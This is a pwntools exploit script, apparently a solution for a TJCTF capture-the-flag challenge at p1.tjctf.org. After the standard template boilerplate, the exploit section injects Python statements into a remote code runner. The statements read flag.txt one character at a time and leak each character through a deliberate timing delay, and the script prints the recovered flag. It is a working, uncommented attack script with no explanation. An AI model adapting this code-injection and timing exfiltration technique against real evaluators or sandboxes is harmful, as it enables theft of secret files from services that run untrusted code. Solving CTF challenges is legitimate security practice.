#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host p1.tjctf.org --port 8005
from pwn import *
import string
# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'p1.tjctf.org'
port = int(args.PORT or 8005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
io = start()
flag = ''
for i in range(100):
    for c in "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM{}_0123456789":
        io.sendline("if open('flag.txt').read(100)[" + str(i) + "] == '" + c + "': x = [y for y in range(1000000)]")
        resp = b'e' not in io.recvline_startswith("Runtime: ")[10:]

        if resp:
            flag += c
            print(flag)
            break
    if flag[-1] == '}': break

print(flag)
io.interactive()

